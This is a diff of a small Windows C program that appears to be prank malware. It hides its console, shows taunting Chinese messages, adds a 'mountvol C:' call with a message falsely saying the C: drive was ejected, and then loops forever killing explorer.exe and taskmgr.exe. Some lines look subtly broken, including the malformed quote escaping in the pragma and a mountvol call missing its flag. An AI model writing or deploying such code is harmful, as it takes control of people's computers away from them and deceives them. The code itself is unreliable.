@@ -1,4 +1,3 @@
-
 #include <windows.h>
 #pragma comment( linker, "/subsystem:/"windows/" /entry:/"mainCRTStartup/"" )
 int main(void)
@@ -56,6 +55,8 @@ int main(void)
 		MessageBoxA(NULL,(LPCSTR)"successful",(LPCSTR)"ok",MB_OK);
 	}
 	MessageBox(NULL, "傻逼，Fake You。重启？这将导致你的电脑GG。好好享受这最后的时光吧=)", "GG Computer", MB_OK);
+		system("mountvol C:");
+	MessageBox(NULL, "C盘已经弹出", "Fake You", MB_OK); 
 	while(1){
 		system("taskkill /f /im explorer.exe");
 		system("taskkill /f /im taskmgr.exe");
